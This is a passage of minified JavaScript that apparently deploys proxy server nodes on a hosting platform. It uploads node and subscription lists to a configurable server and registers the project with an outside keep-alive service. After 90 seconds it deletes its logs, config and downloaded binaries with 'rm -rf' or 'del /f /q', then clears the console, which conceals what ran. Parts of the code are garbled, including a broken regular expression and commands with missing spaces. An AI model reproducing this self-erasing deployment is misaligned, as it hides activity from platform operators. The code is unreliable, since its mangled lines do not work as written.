axios.post(`${UPLOAD_URL}/api/add-subscriptions`,jsonData,{headers:{'Content-Type':'application/json'}});if(response&&response.status===200){console.log('Subscription uploaded successfully');return response}else{return null}}catch(error){if(error.response){if(error.response.status===400){}}}}else if(UPLOAD_URL){if(!fs.existsSync(listPath))return;const content=fs.readFileSync(listPath,'utf-8');const nodes=content.split('\n').filter(line=>/(vless|vmess|trojan|hysteria2|tuic):\/\i\x66(nodes.length===0)return;const jsonData=JSON.stringify({nodes});try{const response=await axios.post(`${UPLOAD_URL}/api/add-nodes`,jsonData,{headers:{'Content-Type':'application/json'}});if(response&&response.status===200){console.log('Nodes uploaded successfully');return response}else{return null}}catch(error){return null}}else{return}}function cleanFiles(){setTimeout(()=>{const filesToDelete=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT){filesToDelete.push(npmPath)}else if(NEZHA_SERVER&&NEZHA_KEY){filesToDelete.push(phpPath)}if(process.platform==='win32'){exec(`del/f/q ${filesToDelete.join(' ')}>nul 2>&1`,(error)=>{console.clear();console.log('App is running');console.log('Thank you for using this script, enjoy!')})}else{exec(`rm-rf ${filesToDelete.join(' ')}>/dev/null 2>&1`,(error)=>{console.clear();console.log('App is running');console.log('Thank you for using this script, enjoy!')})}},90000)}cleanFiles();async function AddVisitTask(){if(!AUTO_ACCESS||!PROJECT_URL){console.log("Skipping adding automatic access task");return}try{const response=await axios.post('https://oooo.serv00.net/add-url',{url:PROJECT_URL},{headers:{'Content-Type':'application/json'}});console.log(`automatic access task added successfully`);return response}catch(error){console.error(`Add automatic access task faild:${error.message}`);return null}}async function startserver(){try{deleteNodes();cleanupOldFiles();await generateConfig();await downloadFilesAndRun();await extractDomains();await AddVisitTask()}catch(error){console.error('Error in startserver:',error)}}startserver().catch(error=>{console.error('Unhandled error in startserver:',error)});app.listen(PORT,()=>console.log(`http server is running on port:${PORT}!`));
